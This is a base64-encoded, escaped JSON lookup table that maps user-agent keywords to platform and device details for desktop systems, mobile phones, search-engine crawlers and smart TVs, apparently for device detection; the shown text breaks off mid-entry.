IFwid2luZG93cyA5NVwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIlBsYXRmb3JtXCI6IHtcIm5hbWVcIjogXCJXaW5kb3dzIDk1XCIsIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsIFwiZGV2ZWxvcGVyXCI6IFwiTWljcm9zb2Z0IENvcnBcIn0sXHJcbiAgICAgICAgICAgICAgICBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ29tcHV0ZXJcIiwgXCJ0eXBlXCI6IFwiRGVza3RvcFwifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIndpbjk1XCI6IHtcclxuICAgICAgICAgICAgICAgIFwiUGxhdGZvcm1cIjoge1wibmFtZVwiOiBcIldpbmRvd3MgOTVcIiwgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIiwgXCJkZXZlbG9wZXJcIjogXCJNaWNyb3NvZnQgQ29ycFwifSxcclxuICAgICAgICAgICAgICAgIFwiRGV2aWNlXCI6IHtcIm5hbWVcIjogXCJDb21wdXRlclwiLCBcInR5cGVcIjogXCJEZXNrdG9wXCJ9XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwid2luMTZcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJQbGF0Zm9ybVwiOiB7XCJuYW1lXCI6IFwiV2luZG93cyAzLjExXCIsIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsIFwiZGV2ZWxvcGVyXCI6IFwiTWljcm9zb2Z0IENvcnBcIn0sXHJcbiAgICAgICAgICAgICAgICBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ29tcHV0ZXJcIiwgXCJ0eXBlXCI6IFwiRGVza3RvcFwifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcInBwY1wiOiBcIk1hY2ludG9zaFwiLFxyXG4gICAgICAgICAgICBcIm1hY2ludG9zaHxtYWMgb3MgeFwiOiBcIk1hYyBPUyBYXCIsXHJcbiAgICAgICAgICAgIFwibWFjX3Bvd2VycGNcIjogXCJNYWMgT1MgOVwiLFxyXG4gICAgICAgICAgICBcIm9zIHhcIjogXCJNYWMgT1MgWFwiLFxyXG4gICAgICAgICAgICBcInBwYyBtYWNcIjogXCJQb3dlciBQQyBNYWNcIixcclxuICAgICAgICAgICAgXCJhbmRyb2lkXCI6IFwiQW5kcm9pZFwiLFxyXG4gICAgICAgICAgICBcIndlYm9zXCI6IFwiTW9iaWxlXCIsXHJcbiAgICAgICAgICAgIFwibW9iaWxlZXhwbG9yZXJcIjogXCJNb2JpbGUgRXhwbG9yZXJcIixcclxuICAgICAgICAgICAgXCJwYWxtc291cmNlXCI6IFwiUGFsbVwiLFxyXG4gICAgICAgICAgICBcInBhbG1zY2FwZVwiOiBcIlBhbG1zY2FwZVwiLFxyXG4gICAgICAgICAgICBcIm1vdG9yb2xhXCI6IFwiTW90b3JvbGFcIixcclxuICAgICAgICAgICAgXCJub2tpYVwiOiBcIk5va2lhXCIsXHJcbiAgICAgICAgICAgIFwiaXBob25lXCI6IFwiQXBwbGUgaVBob25lXCIsXHJcbiAgICAgICAgICAgIFwiaXBhZFwiOiBcImlQYWRcIixcclxuICAgICAgICAgICAgXCJpcG9kXCI6IFwiQXBwbGUgaVBvZCBUb3VjaFwiLFxyXG4gICAgICAgICAgICBcInNvbnlcIjogXCJTb255IEVyaWNzc29uXCIsXHJcbiAgICAgICAgICAgIFwiZXJpY3Nzb25cIjogXCJTb255IEVyaWNzc29uXCIsXHJcbiAgICAgICAgICAgIFwiYmxhY2tiZXJyeVwiOiBcIkJsYWNrQmVycnlcIixcclxuICAgICAgICAgICAgXCJjb2Nvb25cIjogXCJPMiBDb2Nvb25cIixcclxuICAgICAgICAgICAgXCJibGF6ZXJcIjogXCJUcmVvXCIsXHJcbiAgICAgICAgICAgIFwibGdcIjogXCJMR1wiLFxyXG4gICAgICAgICAgICBcImFtb2lcIjogXCJBbW9pXCIsXHJcbiAgICAgICAgICAgIFwieGRhXCI6IFwiWERBXCIsXHJcbiAgICAgICAgICAgIFwibWRhXCI6IFwiTURBXCIsXHJcbiAgICAgICAgICAgIFwidmFyaW9cIjogXCJWYXJpb1wiLFxyXG4gICAgICAgICAgICBcImh0Y1wiOiBcIkhUQ1wiLFxyXG4gICAgICAgICAgICBcInNhbXN1bmdcIjogXCJTYW1zdW5nXCIsXHJcbiAgICAgICAgICAgIFwic2hhcnBcIjogXCJTaGFycFwiLFxyXG4gICAgICAgICAgICBcInNpZS1cIjogXCJTaWVtZW5zXCIsXHJcbiAgICAgICAgICAgIFwiYWxjYXRlbFwiOiBcIkFsY2F0ZWxcIixcclxuICAgICAgICAgICAgXCJiZW5xXCI6IFwiQmVuUVwiLFxyXG4gICAgICAgICAgICBcImlwYXFcIjogXCJIUCBpUGFxXCIsXHJcbiAgICAgICAgICAgIFwibW90LVwiOiBcIk1vdG9yb2xhXCIsXHJcbiAgICAgICAgICAgIFwicGxheXN0YXRpb24gcG9ydGFibGVcIjogXCJQbGF5U3RhdGlvbiBQb3J0YWJsZVwiLFxyXG4gICAgICAgICAgICBcImhpcHRvcFwiOiBcIkRhbmdlciBIaXB0b3BcIixcclxuICAgICAgICAgICAgXCJuZWMtXCI6IFwiTkVDXCIsXHJcbiAgICAgICAgICAgIFwicGFuYXNvbmljXCI6IFwiUGFuYXNvbmljXCIsXHJcbiAgICAgICAgICAgIFwicGhpbGlwc1wiOiBcIlBoaWxpcHNcIixcclxuICAgICAgICAgICAgXCJzYWdlbVwiOiBcIlNhZ2VtXCIsXHJcbiAgICAgICAgICAgIFwic2FueW9cIjogXCJTYW55b1wiLFxyXG4gICAgICAgICAgICBcInNwdlwiOiBcIlNQVlwiLFxyXG4gICAgICAgICAgICBcInp0ZVwiOiBcIlpURVwiLFxyXG4gICAgICAgICAgICBcInNlbmRvXCI6IFwiU2VuZG9cIixcclxuICAgICAgICAgICAgXCJzeW1iaWFuXCI6IFwiU3ltYmlhblwiLFxyXG4gICAgICAgICAgICBcIlN5bWJpYW5PU1wiOiBcIlN5bWJpYW5PU1wiLFxyXG4gICAgICAgICAgICBcImVsYWluZVwiOiBcIlBhbG1cIixcclxuICAgICAgICAgICAgXCJwYWxtXCI6IFwiUGFsbVwiLFxyXG4gICAgICAgICAgICBcInNlcmllczYwXCI6IFwiU3ltYmlhbiBTNjBcIixcclxuICAgICAgICAgICAgXCJ3aW5kb3dzIGNlXCI6IFwiV2luZG93cyBDRVwiLFxyXG4gICAgICAgICAgICBcIm9iaWdvXCI6IFwiT2JpZ29cIixcclxuICAgICAgICAgICAgXCJuZXRmcm9udFwiOiBcIk5ldGZyb250IEJyb3dzZXJcIixcclxuICAgICAgICAgICAgXCJvcGVud2F2ZVwiOiBcIk9wZW53YXZlIEJyb3dzZXJcIixcclxuICAgICAgICAgICAgXCJtb2JpbGV4cGxvcmVyXCI6IFwiTW9iaWxlIEV4cGxvcmVyXCIsXHJcbiAgICAgICAgICAgIFwib3BlcmFtaW5pXCI6IFwiT3BlcmEgTWluaVwiLFxyXG4gICAgICAgICAgICBcIm9wZXJhIG1pbmlcIjogXCJPcGVyYSBNaW5pXCIsXHJcbiAgICAgICAgICAgIFwiZGlnaXRhbCBwYXRoc1wiOiBcIkRpZ2l0YWwgUGF0aHNcIixcclxuICAgICAgICAgICAgXCJhdmFudGdvXCI6IFwiQXZhbnRHb1wiLFxyXG4gICAgICAgICAgICBcInhpaW5vXCI6IFwiWGlpbm9cIixcclxuICAgICAgICAgICAgXCJub3ZhcnJhXCI6IFwiTm92YXJyYSBUcmFuc2NvZGVyXCIsXHJcbiAgICAgICAgICAgIFwidm9kYWZvbmVcIjogXCJWb2RhZm9uZVwiLFxyXG4gICAgICAgICAgICBcImRvY29tb1wiOiBcIk5UVCBEb0NvTW9cIixcclxuICAgICAgICAgICAgXCJvMlwiOiBcIk8yXCIsXHJcbiAgICAgICAgICAgIFwibW9iaWxlXCI6IFwiR2VuZXJpYyBNb2JpbGVcIixcclxuICAgICAgICAgICAgXCJ3aXJlbGVzc1wiOiBcIkdlbmVyaWMgTW9iaWxlXCIsXHJcbiAgICAgICAgICAgIFwiajJtZVwiOiBcIkdlbmVyaWMgTW9iaWxlXCIsXHJcbiAgICAgICAgICAgIFwibWlkcFwiOiBcIkdlbmVyaWMgTW9iaWxlXCIsXHJcbiAgICAgICAgICAgIFwiY2xkY1wiOiBcIkdlbmVyaWMgTW9iaWxlXCIsXHJcbiAgICAgICAgICAgIFwidXAubGlua1wiOiBcIkdlbmVyaWMgTW9iaWxlXCIsXHJcbiAgICAgICAgICAgIFwidXAuYnJvd3NlclwiOiBcIkdlbmVyaWMgTW9iaWxlXCIsXHJcbiAgICAgICAgICAgIFwic21hcnRwaG9uZVwiOiBcIkdlbmVyaWMgTW9iaWxlXCIsXHJcbiAgICAgICAgICAgIFwiY2VsbHBob25lXCI6IFwiR2VuZXJpYyBNb2JpbGVcIixcclxuICAgICAgICAgICAgXCJSYXNwYmlhblwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIlBsYXRmb3JtXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJSYXNwYmlhbiBQaVwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJkZXZlbG9wZXJcIjogXCJSYXNwYmVycnkgUGkgRm91bmRhdGlvblwiXHJcbiAgICAgICAgICAgICAgICB9LCBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ29tcHV0ZXJcIiwgXCJ0eXBlXCI6IFwiRGVza3RvcFwifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIk1haWwuUlVfQm90XCI6IHtcclxuICAgICAgICAgICAgICAgIFwiUGxhdGZvcm1cIjoge1wibmFtZVwiOiBcIk1haWwucnUgQ3Jhd2xlclwiLCBcImFyY2hpdGVjdHVyZVwiOiBcIjMyLWJpdFwiLCBcImRldmVsb3BlclwiOiBcIk1haWwgUlVcIn0sXHJcbiAgICAgICAgICAgICAgICBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ3Jhd2xlclwiLCBcInR5cGVcIjogXCJTZXJ2ZXJcIn1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJHb29nbGVib3RcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJQbGF0Zm9ybVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiR29vZ2xlYm90IENyYXdsZXJcIixcclxuICAgICAgICAgICAgICAgICAgICBcImFyY2hpdGVjdHVyZVwiOiBcIjMyLWJpdFwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiZGV2ZWxvcGVyXCI6IFwiR29vZ2xlIEluY1wiXHJcbiAgICAgICAgICAgICAgICB9LCBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ3Jhd2xlclwiLCBcInR5cGVcIjogXCJTZXJ2ZXJcIn1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJCYWlkdXNwaWRlclwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIlBsYXRmb3JtXCI6IHtcIm5hbWVcIjogXCJCYWlkdSBTcGlkZXJcIiwgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIiwgXCJkZXZlbG9wZXJcIjogXCJCYWlkdSBJbmNcIn0sXHJcbiAgICAgICAgICAgICAgICBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ3Jhd2xlclwiLCBcInR5cGVcIjogXCJTZXJ2ZXJcIn1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJiaW5nYm90XCI6IHtcclxuICAgICAgICAgICAgICAgIFwiUGxhdGZvcm1cIjoge1wibmFtZVwiOiBcIkJpbmcgQm90XCIsIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsIFwiZGV2ZWxvcGVyXCI6IFwiTWljcm9zb2Z0IENvcnBcIn0sXHJcbiAgICAgICAgICAgICAgICBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ3Jhd2xlclwiLCBcInR5cGVcIjogXCJTZXJ2ZXJcIn1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJtc25ib3RcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJQbGF0Zm9ybVwiOiB7XCJuYW1lXCI6IFwiTVNOIEJvdFwiLCBcImFyY2hpdGVjdHVyZVwiOiBcIjMyLWJpdFwiLCBcImRldmVsb3BlclwiOiBcIk1pY3Jvc29mdCBDb3JwXCJ9LFxyXG4gICAgICAgICAgICAgICAgXCJEZXZpY2VcIjoge1wibmFtZVwiOiBcIkNyYXdsZXJcIiwgXCJ0eXBlXCI6IFwiU2VydmVyXCJ9XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwiTUoxMmJvdFwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIlBsYXRmb3JtXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJNYWplc3RpYy0xMiBEaXN0cmlidXRlZCBTZWFyY2ggQm90XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIixcclxuICAgICAgICAgICAgICAgICAgICBcImRldmVsb3BlclwiOiBcIk1hamVzdGljXCJcclxuICAgICAgICAgICAgICAgIH0sIFwiRGV2aWNlXCI6IHtcIm5hbWVcIjogXCJDcmF3bGVyXCIsIFwidHlwZVwiOiBcIlNlcnZlclwifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIllhaG9vISBTbHVycFwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIlBsYXRmb3JtXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJZYWhvbyEgU2x1cnAgV2ViIENyYXdsZXIgQm90XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIixcclxuICAgICAgICAgICAgICAgICAgICBcImRldmVsb3BlclwiOiBcIllhaG9vIExMQ1wiXHJcbiAgICAgICAgICAgICAgICB9LCBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ3Jhd2xlclwiLCBcInR5cGVcIjogXCJTZXJ2ZXJcIn1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJNZWdhSW5kZXgucnVcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJQbGF0Zm9ybVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiTWVnYUluZGV4IENyYXdsZXIgQm90XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIixcclxuICAgICAgICAgICAgICAgICAgICBcImRldmVsb3BlclwiOiBcIk1lZ2FJbmRleC5ydVwiXHJcbiAgICAgICAgICAgICAgICB9LCBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ3Jhd2xlclwiLCBcInR5cGVcIjogXCJTZXJ2ZXJcIn1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJBaHJlZnNCb3RcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJQbGF0Zm9ybVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiQWhyZWZzIEJhY2tsaW5rIFJlc2VhcmNoIEJvdFwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJkZXZlbG9wZXJcIjogXCJBaHJlZnNcIlxyXG4gICAgICAgICAgICAgICAgfSwgXCJEZXZpY2VcIjoge1wibmFtZVwiOiBcIkNyYXdsZXJcIiwgXCJ0eXBlXCI6IFwiU2VydmVyXCJ9XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwiRG90Qm90XCI6IHtcclxuICAgICAgICAgICAgICAgIFwiUGxhdGZvcm1cIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIk9wZW5TaXRlIEV4cGxvcmVyIENyYXdsZXJcIixcclxuICAgICAgICAgICAgICAgICAgICBcImFyY2hpdGVjdHVyZVwiOiBcIjMyLWJpdFwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiZGV2ZWxvcGVyXCI6IFwiVGhlIE1velwiXHJcbiAgICAgICAgICAgICAgICB9LCBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ3Jhd2xlclwiLCBcInR5cGVcIjogXCJTZXJ2ZXJcIn1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJKb2Jib2Vyc2VCb3RcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJQbGF0Zm9ybVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiSm9iYm9lcnNlIENyYXdsZXJcIixcclxuICAgICAgICAgICAgICAgICAgICBcImFyY2hpdGVjdHVyZVwiOiBcIjMyLWJpdFwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiZGV2ZWxvcGVyXCI6IFwiam9iYm9lcnNlLmNvbVwiXHJcbiAgICAgICAgICAgICAgICB9LCBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ3Jhd2xlclwiLCBcInR5cGVcIjogXCJTZXJ2ZXJcIn1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJTZW1ydXNoQm90XCI6IHtcclxuICAgICAgICAgICAgICAgIFwiUGxhdGZvcm1cIjoge1wibmFtZVwiOiBcIlNFTVJ1c2ggQ3Jhd2xlclwiLCBcImFyY2hpdGVjdHVyZVwiOiBcIjMyLWJpdFwiLCBcImRldmVsb3BlclwiOiBcIlNFTXJ1c2hcIn0sXHJcbiAgICAgICAgICAgICAgICBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ3Jhd2xlclwiLCBcInR5cGVcIjogXCJTZXJ2ZXJcIn1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJZYW5kZXhCb3RcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJQbGF0Zm9ybVwiOiB7XCJuYW1lXCI6IFwiWWFuZGV4IFNlYXJjaCBCb3RcIiwgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIiwgXCJkZXZlbG9wZXJcIjogXCJZYW5kZXhcIn0sXHJcbiAgICAgICAgICAgICAgICBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ3Jhd2xlclwiLCBcInR5cGVcIjogXCJTZXJ2ZXJcIn1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJzZW9zY2FubmVycy5uZXRcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJQbGF0Zm9ybVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiU0VPIFNjYW5uZXJzIENyYXdsZXIgQm90XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIixcclxuICAgICAgICAgICAgICAgICAgICBcImRldmVsb3BlclwiOiBcIlNFTyBTY2FubmVyc1wiXHJcbiAgICAgICAgICAgICAgICB9LCBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ3Jhd2xlclwiLCBcInR5cGVcIjogXCJTZXJ2ZXJcIn1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJTRU9raWNrcy1Sb2JvdFwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIlBsYXRmb3JtXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJTRU9raWNrcyBDcmF3bGVyXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIixcclxuICAgICAgICAgICAgICAgICAgICBcImRldmVsb3BlclwiOiBcIlNFT2tpY2tzXCJcclxuICAgICAgICAgICAgICAgIH0sIFwiRGV2aWNlXCI6IHtcIm5hbWVcIjogXCJDcmF3bGVyXCIsIFwidHlwZVwiOiBcIlNlcnZlclwifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIkNoZWNrTWFya05ldHdvcmtcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJQbGF0Zm9ybVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiQ2hlY2tNYXJrIE5ldHdvcmsgQ3Jhd2xlclwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJkZXZlbG9wZXJcIjogXCJDaGVja01hcmtcIlxyXG4gICAgICAgICAgICAgICAgfSwgXCJEZXZpY2VcIjoge1wibmFtZVwiOiBcIkNyYXdsZXJcIiwgXCJ0eXBlXCI6IFwiU2VydmVyXCJ9XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwiQmluZ1ByZXZpZXdcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJQbGF0Zm9ybVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiQmluZyBQcmV2aWV3IFNuYXBzaG90IEdlbmVyYXRvclwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJkZXZlbG9wZXJcIjogXCJNaWNyb3NvZnQgQ29ycFwiXHJcbiAgICAgICAgICAgICAgICB9LCBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiQ3Jhd2xlclwiLCBcInR5cGVcIjogXCJTZXJ2ZXJcIn1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJWb2lsYUJvdCBCRVRBXCI6IHtcclxuICAgICAgICAgICAgICAgIFwiUGxhdGZvcm1cIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIlZvaWxhQm90IEJFVEFcIixcclxuICAgICAgICAgICAgICAgICAgICBcImFyY2hpdGVjdHVyZVwiOiBcIjMyLWJpdFwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiZGV2ZWxvcGVyXCI6IFwib3JhbmdlIGZ0IGdyb3VwXCJcclxuICAgICAgICAgICAgICAgIH0sIFwiRGV2aWNlXCI6IHtcIm5hbWVcIjogXCJDcmF3bGVyXCIsIFwidHlwZVwiOiBcIlNlcnZlclwifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcImFkc2Nhbm5lclwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIlBsYXRmb3JtXCI6IHtcIm5hbWVcIjogXCJBZFNjYW5uZXIgQ3Jhd2xlclwiLCBcImFyY2hpdGVjdHVyZVwiOiBcIjMyLWJpdFwiLCBcImRldmVsb3BlclwiOiBcIkFkU2Nhbm5lclwifSxcclxuICAgICAgICAgICAgICAgIFwiRGV2aWNlXCI6IHtcIm5hbWVcIjogXCJDcmF3bGVyXCIsIFwidHlwZVwiOiBcIlNlcnZlclwifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIlF3YW50aWZ5XCI6IHtcclxuICAgICAgICAgICAgICAgIFwiUGxhdGZvcm1cIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIlF3YW50aWZ5IFNlYXJjaCBDcmF3bGVyXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIixcclxuICAgICAgICAgICAgICAgICAgICBcImRldmVsb3BlclwiOiBcIlF3YW50aWZ5XCJcclxuICAgICAgICAgICAgICAgIH0sIFwiRGV2aWNlXCI6IHtcIm5hbWVcIjogXCJDcmF3bGVyXCIsIFwidHlwZVwiOiBcIlNlcnZlclwifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcImFwcGxlIHR2XCI6IHtcIm5hbWVcIjogXCJBcHBsZVRWXCIsIFwiZGV2aWNlXCI6IFwiVGVsZXZpc2lvblwiLCBcIm1hbnVmYWN0dXJlXCI6IFwiQXBwbGUgSW5jLlwifSxcclxuICAgICAgICAgICAgXCJjaHJvbWVjYXN0XCI6IHtcIm5hbWVcIjogXCJDaHJvbWVjYXN0XCIsIFwiZGV2aWNlXCI6IFwiVGVsZXZpc2lvblwiLCBcIm1hbnVmYWN0dXJlXCI6IFwiR29vZ2xlIEluYy5cIn0sXHJcbiAgICAgICAgICAgIFwiYWZ0YlwiOiB7XCJuYW1lXCI6IFwiRmlyZSBUVlwiLCBcImRldmljZVwiOiBcIlRlbGV2aXNpb25cIiwgXCJtYW51ZmFjdHVyZVwiOiBcIkFtYXpvbi5jb20sIEluYy5cIn0sXHJcbiAgICAgICAgICAgIFwiZnJlZWJveFwiOiB7XCJuYW1lXCI6IFwiRnJlZWJveCBSZXZvbHV0aW9uXCIsIFwiZGV2aWNlXCI6IFwiVGVsZXZpc2lvblwiLCBcIm1hbnVmYWN0dXJlXCI6IFwiRlJFRSBTQVMuXCJ9LFxyXG4gICAgICAgICAgICBcImdvb2dsZXR2XCI6IHtcIm5hbWVcIjogXCJHb29nbGUgVFZcIiwgXCJkZXZpY2VcIjogXCJUZWxldmlzaW9uXCIsIFwibWFudWZhY3R1cmVcIjogXCJTb255LlwifSxcclxuICAgICAgICAgICAgXCJuZXRib3hcIjoge1wibmFtZVwiOiBcIk5ldGJveFwiLCBcImRldmljZVwiOiBcIlRlbGV2aXNpb25cIiwgXCJtYW51ZmFjdHVyZVwiOiBcIlNvbnkuXCJ9LFxyXG4gICAgICAgICAgICBcInBsYXlzdGF0aW9uIDNcIjoge1wibmFtZVwiOiBcIlBsYXlzdGF0aW9uIDNcIiwgXCJkZXZpY2VcIjogXCJUZWxldmlzaW9uXCIsIFwibWFudWZhY3R1cmVcIjogXCJTb255LlwifSxcclxuICAgICAgICAgICAgXCJwbGF5c3RhdGlvbiA0XCI6IHtcIm5hbWVcIjogXCJQbGF5c3RhdGlvbiA0XCIsIFwiZGV2aWNlXCI6IFwiVGVsZXZpc2lvblwiLCBcIm1hbnVmYWN0dXJlXCI6IFwiU29ueS5cIn0sXHJcbiAgICAgICAgICAgIFwia2RsMzJDeDUyNVwiOiB7XCJuYW1lXCI6IFwiS0RMMzJDWDUyNVwiLCBcInRkZXZpY2V5cGVcIjogXCJUZWxldmlzaW9uXCIsIFwibWFudWZhY3R1cmVcIjogXCJTb255LlwifSxcclxuICAgICAgICAgICAgXCJuc3otZ3M3XFxcXFxcL2d4NzBcIjoge1wibmFtZVwiOiBcIk5TWi1HUzdcXC9HWDcwXCIsIFwiZGV2aWNlXCI6IFwiVGVsZXZpc2lvblwiLCBcIm1hbnVmYWN0dXJlXCI6IFwiU29ueS5cIn0sXHJcbiAgICAgICAgICAgIFwiaDk2IHByb1xcXFwrXCI6IHtcIm5hbWVcIjogXCJIOTYgUHJvK1wiLCBcImRldmljZVwiOiBcIlRlbGV2aXNpb25cIiwgXCJtYW51ZmFjdHVyZVwiOiBcIkFsZmF3aXNlLlwifSxcclxuICAgICAgICAgICAgXCJteCBlbmpveSB0dlwiOiB7XCJuYW1lXCI6IFwiTVggRW5qb3kgVFYgQk9YXCIsIFwiZGV2aWNlXCI6IFwiVGVsZXZpc2lvblwiLCBcIm1hbnVmYWN0dXJlXCI6IFwiR2VuaWF0ZWNoLlwifSxcclxuICAgICAgICAgICAgXCJzbWFydHR2MjAxNlwiOiB7XCJuYW1lXCI6IFwiU2VyaWVzIEogKDIwMTYpXCIsIFwiZGV2aWNlXCI6IFwiVGVsZXZpc2lvblwiLCBcIm1hbnVmYWN0dXJlXCI6IFwiU2Ftc3VuZy5cIn0sXHJcbiAgICAgICAgICAgIFwic21hcnQtdHZcIjoge1wibmFtZVwiOiBcIlNtYXJ0IFRWXCIsIFwiZGV2aWNlXCI6IFwiVGVsZXZpc2lvblwiLCBcIm1hbnVmYWN0dXJlXCI6IFwiU2Ftc3VuZy5cIn0sXHJcbiAgICAgICAgICAgIFwidHBtMTcxZVwiOiB7XCJuYW1lXCI6IFwiVFBNMTcxRVwiLCBcImRldmljZVwiOiBcIlRlbGV2aXNpb25cIiwgXCJtYW51ZmFjdHVyZVwiOiBcIlBoaWxpcHMuXCJ9LFxyXG4gICAgICAgICAgICBcInNtYXJ0dHZhXCI6IHtcIm5hbWVcIjogXCJUVlwiLCBcImRldmljZVwiOiBcIlRlbGV2aXNpb25cIiwgXCJtYW51ZmFjdHVyZVwiOiBcIkxHLlwifSxcclxuICAgICAgICAgICAgXCJ2YXA0MzBcIjoge1wibmFtZVwiOiBcIlZBUDQzMFwiLCBcImRldmljZVwiOiBcIlRlbGV2aXNpb25cIiwgXCJtYW51ZmFjdHVyZVwiOiBcIlZpemlvLlwifSxcclxuICAgICAgICAgICAgXCJ2aWVyYVwiOiB7XCJuYW1lXCI6IFwiVmllcmEgVFZcIiwgXCJkZXZpY2VcIjogXCJUZWxldmlzaW9uXCIsIFwibWFudWZhY3R1cmVcIjogXCJQYW5hc29uaWMuXCJ9LFxyXG4gICAgICAgICAgICBcIndlYnR2XCI6IHtcIm5hbWVcIjogXCJXZWJUVlwiLCBcImRldmljZVw